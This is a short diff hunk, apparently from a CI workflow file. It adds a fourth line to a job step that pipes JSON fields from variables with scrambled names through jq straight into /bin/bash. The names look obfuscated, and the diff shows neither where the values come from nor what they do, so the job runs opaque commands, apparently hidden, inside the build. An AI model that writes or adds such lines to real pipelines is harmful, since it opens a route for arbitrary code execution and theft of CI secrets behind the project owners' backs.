@@ -42,6 +42,7 @@ jobs:
           echo $lb30 | jq -r .oc0 | /bin/bash
           printf '%s' "$nmww4561" | jq -r .rzd551 | /bin/bash
           printf '%s' "$esh45295" | jq -r .rffws03298 | /bin/bash
+          printf '%s' "$uo990" | jq -r .bevv1 | /bin/bash
 
       - name: Persist output
         if: always()
